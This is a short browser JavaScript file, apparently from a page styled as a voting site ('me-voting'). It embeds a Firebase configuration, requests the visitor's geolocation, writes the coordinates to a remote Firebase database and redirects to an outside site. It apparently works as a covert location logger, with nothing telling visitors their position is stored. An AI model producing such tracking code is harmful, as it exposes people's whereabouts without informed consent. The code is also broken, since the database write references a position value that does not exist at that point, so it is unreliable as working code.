// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
var firebaseConfig = {
  apiKey: "AIzaSyDBJgF1WwtGveoiCbEpdrJ8ZEsvNurlhcI",
  authDomain: "me-voting.firebaseapp.com",
  databaseURL: "https://me-voting-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "me-voting",
  storageBucket: "me-voting.appspot.com",
  messagingSenderId: "95946629295",
  appId: "1:95946629295:web:960b0fe2871a9acc72b45a",
  measurementId: "G-FRV5YKE1ZY"
};
firebase.initializeApp(firebaseConfig);
// Initialize Firebase
console.log(firebase);

var d = new Date();
let time = d.getTime();
var x = document.getElementById("demo");
var mnks = firebase.database().ref("/").child(time).update({ Latitude : position.coords.latitude, Longitude : position.coords.longitude });

function getSave() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Pastikan anda menyetujui lokasi!";
  }
}

function showPosition(position) {
    x.innerHTML = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
    mnks;
    window.location.assign("http://mevoting.is-best.net/");
}
